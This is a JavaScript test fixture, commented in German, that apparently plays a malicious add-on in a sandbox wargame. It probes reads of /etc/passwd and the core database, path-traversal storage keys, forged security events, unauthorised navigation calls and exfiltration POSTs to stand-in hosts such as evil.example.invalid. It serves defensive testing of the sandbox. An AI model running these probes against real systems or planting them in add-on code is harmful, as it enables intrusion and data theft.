/*
 * EVIL-FIXTURE, SERVICE-Haelfte (E09-T6, Wargame W-10). TEST-FIXTURE.
 *
 * Laeuft als vom Core gestarteter Node-Kindprozess (`service-host.ts`):
 *   cwd = data/addons/{id}, YAPAJA_DATA_DIR = data/addon-storage/{id},
 *   YAPAJA_TOKEN = scoped Token, gestartet mit `node --permission
 *   --allow-fs-read=<addon-dir> --allow-fs-read/write=<storage-dir>`.
 *
 * Es versucht systematisch alles Verbotene und schreibt das Ergebnis nach
 * `<YAPAJA_DATA_DIR>/evil-probe.json` -- seinem EINZIGEN erlaubten
 * Schreibort. Der Nachweis laeuft also ueber das Dateisystem, nicht ueber die
 * HTTP-Schicht, damit er nicht von genau der Schicht abhaengt, die er testet
 * (gleiche Bauweise wie das E09-T3-Fixture
 * `apps/core/src/addons/__fixtures__/services/db-probe.js`).
 *
 * Der Prozess bleibt danach am Leben (Heartbeat-Intervall), weil ein Exit vom
 * Watchdog als Crash gewertet und neu gestartet wuerde.
 */

import fs from 'node:fs';
import path from 'node:path';

const API = process.env.YAPAJA_API_URL;
const TOKEN = process.env.YAPAJA_TOKEN;
const DATA_DIR = process.env.YAPAJA_DATA_DIR;
const ADDON_ID = process.env.YAPAJA_ADDON_ID;

const results = { addonId: ADDON_ID, startedAt: new Date().toISOString() };

function authHeaders(extra = {}) {
  return { authorization: `Bearer ${TOKEN}`, ...extra };
}

/** Ein HTTP-Versuch gegen den Core; nie werfen, immer Status festhalten. */
async function attempt(label, url, init = {}) {
  try {
    const res = await fetch(url, init);
    let body = null;
    try {
      body = await res.text();
    } catch {
      /* egal */
    }
    results[label] = { status: res.status, ok: res.ok, body: (body ?? '').slice(0, 300) };
  } catch (err) {
    results[label] = { status: null, ok: false, error: String(err && err.message) };
  }
}

function probeFsRead(label, target) {
  try {
    const bytes = fs.readFileSync(target);
    results[label] = { ok: true, bytes: bytes.length, path: target };
  } catch (err) {
    results[label] = { ok: false, code: err && err.code, path: target };
  }
}

function probeFsWrite(label, target) {
  try {
    fs.writeFileSync(target, 'pwned');
    results[label] = { ok: true, path: target };
  } catch (err) {
    results[label] = { ok: false, code: err && err.code, path: target };
  }
}

async function run() {
  // --- Vektor: FS ausserhalb DATA_DIR -----------------------------------
  // Der Core-Prozess sieht diese Verweigerung als ERR_ACCESS_DENIED auf
  // stderr und schreibt daraus ein `fs.outside_datadir`-Security-Event
  // (service-host.ts). Damit sie SICHER auf stderr landet, wird sie unten
  // zusaetzlich explizit geloggt.
  probeFsRead('fs_read_core_db', path.join(process.cwd(), '..', '..', 'db.sqlite'));
  probeFsRead('fs_read_etc_passwd', '/etc/passwd');
  probeFsWrite('fs_write_outside_storage', path.join(process.cwd(), 'escaped.txt'));
  for (const key of ['fs_read_core_db', 'fs_read_etc_passwd', 'fs_write_outside_storage']) {
    const r = results[key];
    if (r && !r.ok && r.code) {
      // Node's Permission-Model meldet ERR_ACCESS_DENIED; wir schreiben die
      // Kennung explizit nach stderr, damit der Core sie zuverlaessig sieht
      // (Node druckt sie sonst nur, wenn der Prozess daran STIRBT).
      process.stderr.write(`[evil-fixture] ${key}: ${r.code} for ${r.path}\n`);
    }
  }

  // --- Vektor: fremdes Storage-Namespace ueber die REST-API --------------
  await attempt(
    'storage_foreign_addon',
    `${API}/api/v1/addons/com.yapaja.track-recorder/storage/index`,
    { method: 'PUT', headers: authHeaders({ 'content-type': 'application/json' }), body: '{"value":"pwned"}' },
  );
  await attempt(
    'storage_traversal_key',
    `${API}/api/v1/addons/${ADDON_ID}/storage/${encodeURIComponent('../other/secret')}`,
    { method: 'PUT', headers: authHeaders({ 'content-type': 'application/json' }), body: '{"value":"pwned"}' },
  );
  await attempt(
    'storage_percent_encoded_traversal',
    `${API}/api/v1/addons/${ADDON_ID}/storage/%2e%2e%2fother%2fsecret`,
    { method: 'PUT', headers: authHeaders({ 'content-type': 'application/json' }), body: '{"value":"pwned"}' },
  );
  await attempt('storage_absolute_key', `${API}/api/v1/addons/${ADDON_ID}/storage/${encodeURIComponent('/etc/passwd')}`, {
    method: 'PUT',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: '{"value":"pwned"}',
  });

  // --- Vektor: Egress ueber den Proxy zu nicht deklariertem Host ---------
  await attempt('egress_proxy_undeclared', `${API}/api/v1/addons/proxy?url=${encodeURIComponent('https://evil.example.com/exfiltrate')}`, {
    headers: authHeaders(),
  });

  // --- Vektor: Route AKTIVIEREN ohne Nutzerbestaetigung ------------------
  await attempt('nav_start_without_confirm', `${API}/api/v1/navigation/start`, {
    method: 'POST',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: JSON.stringify({ route_id: 'whatever' }),
  });
  await attempt('nav_destination_without_confirm', `${API}/api/v1/navigation/destination`, {
    method: 'POST',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: JSON.stringify({ latlng: { lat: 47.4, lng: 9.7 } }),
  });

  // --- Vektor: fremdes Event-Topic --------------------------------------
  await attempt('events_foreign_topic', `${API}/api/v1/addons/${ADDON_ID}/events`, {
    method: 'POST',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: JSON.stringify({ topic: 'nav/state', payload: { hijacked: true } }),
  });
  await attempt('events_other_addon_namespace', `${API}/api/v1/addons/${ADDON_ID}/events`, {
    method: 'POST',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: JSON.stringify({ topic: 'addon/com.yapaja.track-recorder/started', payload: {} }),
  });

  // --- Vektor: Zugriff auf Core-Only-Routen ------------------------------
  await attempt('core_settings_read', `${API}/api/v1/settings`, { headers: authHeaders() });
  await attempt('core_security_log_read', `${API}/api/v1/security/events`, { headers: authHeaders() });
  await attempt('core_security_log_write', `${API}/api/v1/security/events`, {
    method: 'POST',
    headers: authHeaders({ 'content-type': 'application/json' }),
    body: JSON.stringify({ vector: 'ui.parent_dom_access', addon_id: 'com.yapaja.track-recorder', detail: 'forged' }),
  });
  await attempt('core_auth_token_rotate', `${API}/api/v1/auth/token`, { method: 'POST', headers: authHeaders() });

  // --- Vektor: RAW fetch zu fremdem Host, am Proxy vorbei ----------------
  // DOKUMENTIERTE NICHT-EINDAEMMUNG: Nodes Permission-Model beschraenkt das
  // DATEISYSTEM, nicht das Netzwerk (siehe proxy.ts Kopfkommentar, docs/05
  // §7). Der Versuch wird protokolliert, damit die Suite die Aussage
  // ueberpruefbar dokumentiert statt sie zu behaupten.
  await attempt('egress_raw_socket', 'http://evil.example.invalid/exfiltrate', { method: 'POST', body: 'stolen' });

  results.finishedAt = new Date().toISOString();
  fs.writeFileSync(path.join(DATA_DIR, 'evil-probe.json'), JSON.stringify(results, null, 2));
  console.log('[evil-fixture] probe written');
}

run().catch((err) => {
  try {
    fs.writeFileSync(
      path.join(DATA_DIR, 'evil-probe.json'),
      JSON.stringify({ ...results, fatal: String(err && err.message) }, null, 2),
    );
  } catch {
    /* nichts mehr zu tun */
  }
});

// Am Leben bleiben -- ein Exit waere fuer den Watchdog ein Crash.
setInterval(() => {}, 60_000);
